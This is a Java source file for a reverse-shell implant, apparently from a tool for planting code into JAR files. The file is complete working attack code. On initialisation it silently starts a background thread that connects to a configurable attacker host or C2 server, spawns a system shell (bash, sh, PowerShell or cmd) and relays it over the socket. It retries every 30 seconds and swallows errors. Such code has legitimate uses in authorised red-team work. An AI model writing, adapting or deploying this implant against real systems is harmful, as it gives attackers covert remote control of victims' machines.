package io.github.w1th4d.jarplant.implants;

import java.io.Closeable;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;
import java.util.Optional;

public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandler {
    // Standard config fields from ClassImplant template:
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * Hostname, IPv4 address or IPv6 address to connect back to.
     * This should be your attack box or C2 infra.
     */
    static volatile String CONF_LHOST = "localhost";

    /**
     * TCP port number to use when connecting back.
     */
    static volatile int CONF_LPORT = 12345;

    /**
     * Amount of seconds to wait between connection attempts.
     */
    static volatile int CONF_RETRY_WAIT_SECONDS = 30;

    /**
     * Print debug output to stdout.
     * Setting this to false will make the implant completely quiet.
     */
    static volatile boolean CONF_DEBUG_OUTPUT = true;

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                RevShellImplant implant = new RevShellImplant();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    private void payload() {
        if (CONF_LHOST == null || CONF_LHOST.isEmpty()) {
            return;
        }

        Optional<Path> shellCommand = findShellExecutable();
        if (shellCommand.isEmpty()) {
            log("[!] Cannot find shell executable!");
            return;
        }

        while (!Thread.interrupted()) {
            log("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
            Process shell = null;
            try (Socket connection = new Socket(CONF_LHOST, CONF_LPORT);
                 InputStream fromRemote = connection.getInputStream();
                 OutputStream toRemote = connection.getOutputStream()
            ) {
                log("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");

                String shellCommandExecStr = shellCommand.get().toAbsolutePath().toString();
                shell = new ProcessBuilder()
                        .command(shellCommandExecStr)
                        .redirectErrorStream(true)
                        .start();
                InputStream fromShell = shell.getInputStream();
                OutputStream toShell = shell.getOutputStream();
                log("[$] Shell '" + shellCommandExecStr + "' popped with PID " + shell.pid() + ".");

                log("[ ] Transferring data between shell and socket...");
                handleCommunications(fromShell, toShell, fromRemote, toRemote, connection);

                log("[ ] Terminated.");
            } catch (IOException e) {
                log("[!] " + e.getClass().getName() + ": " + e.getMessage());
                try {
                    Thread.sleep(Duration.ofSeconds(CONF_RETRY_WAIT_SECONDS).toMillis());
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                }
            } catch (InterruptedException ignored) {
                Thread.currentThread().interrupt();
            } finally {
                if (shell != null) {
                    shell.destroy();
                }
            }
        }
    }

    // Separate method for testability.
    static void handleCommunications(InputStream fromShell, OutputStream toShell, InputStream fromRemote, OutputStream toRemote, Socket socket) throws InterruptedException {
        List<Thread> threads = new LinkedList<>();

        Thread pipe1 = new Thread(() -> {
            transfer(fromShell, toRemote, threads);
            closeAll(fromShell, toShell, fromRemote, toRemote, socket);
        });

        Thread pipe2 = new Thread(() -> {
            transfer(fromRemote, toShell, threads);
            closeAll(fromShell, toShell, fromRemote, toRemote, socket);
        });

        threads.add(pipe1);
        threads.add(pipe2);

        pipe1.start();
        pipe2.start();

        pipe1.join();
        System.out.println("shell -> socket: done");
        pipe2.join();
        System.out.println("socket -> shell: done");
    }

    /**
     * Transfer all data from one stream to another.
     * No string/text interpretation will be done. Just raw bytes.
     * This method blocks and returns only if the streams are closed, or the current thread is interrupted.
     *
     * @param input  from
     * @param output to
     */
    private static void transfer(InputStream input, OutputStream output, List<Thread> threads) {
        System.out.println("transfer started");

        byte[] buffer = new byte[256];
        while (!Thread.interrupted()) {
            try {
                int readAmount = input.read(buffer);
                if (readAmount == -1) {
                    break;
                }
                output.write(buffer, 0, readAmount);
                output.flush();
            } catch (IOException e) {
                break;
            }
        }

        for (Thread thread : threads) {
            thread.interrupt();
        }
    }

    private static void closeAll(Closeable... closeables) {
        for (Closeable closeable : closeables) {
            try {
                closeable.close();
            } catch (IOException ignored) {
            }
        }
    }

    /**
     * Find the most preferred shell depending on the operating system and what's available.
     *
     * @return maybe a path to an executable file
     */
    private static Optional<Path> findShellExecutable() {
        String osName = System.getProperty("os.name").toLowerCase();
        if (osName.startsWith("windows")) {
            String pathEnv = System.getenv("PATH");
            return findWindowsShellExecutable(FileSystems.getDefault(), pathEnv);
        } else if (osName.startsWith("linux")) {
            return findUnixShellExecutable(FileSystems.getDefault());
        } else if (osName.startsWith("mac")) {
            return findUnixShellExecutable(FileSystems.getDefault());
        } else {
            return Optional.empty();
        }
    }

    // Separate method for testability.
    static Optional<Path> findUnixShellExecutable(FileSystem fs) {
        List<Path> candidates = Arrays.asList(
                fs.getPath("/bin/bash"),
                fs.getPath("/bin/zsh"),
                fs.getPath("/bin/sh")
        );
        for (Path candidate : candidates) {
            if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                return Optional.of(candidate);
            }
        }

        return Optional.empty();
    }

    // Separate method for testability.
    static Optional<Path> findWindowsShellExecutable(FileSystem fs, String pathEnv) {
        if (pathEnv == null || pathEnv.isEmpty()) {
            return Optional.empty();
        }

        Optional<Path> powershell = Optional.empty();
        Optional<Path> cmd = Optional.empty();

        // PowerShell can exist on some various paths depending on the version and how it was installed.
        // cmd is expected to always be in the same place, but do what Windows does and search the PATH for it.
        String[] binPaths = pathEnv.split(";");
        for (String binPath : binPaths) {
            Path path = fs.getPath(binPath);
            if (Files.exists(path) && Files.isDirectory(path)) {
                if (powershell.isEmpty()) {
                    Path candidate = path.resolve("powershell.exe");
                    if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                        powershell = Optional.of(candidate);
                    }
                }

                if (cmd.isEmpty()) {
                    Path candidate = path.resolve("cmd.exe");
                    if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                        cmd = Optional.of(candidate);
                    }
                }
            }
        }

        // PowerShell is preferred over cmd but cmd is better than nothing.
        if (powershell.isPresent()) {
            return powershell;
        } else if (cmd.isPresent()) {
            return cmd;
        } else {
            return Optional.empty();
        }
    }

    private static void log(String msg) {
        if (CONF_DEBUG_OUTPUT) {
            System.out.println(msg);
        }
    }

    public static void main(String[] args) {
        RevShellImplant implant = new RevShellImplant();
        implant.payload();
    }
}
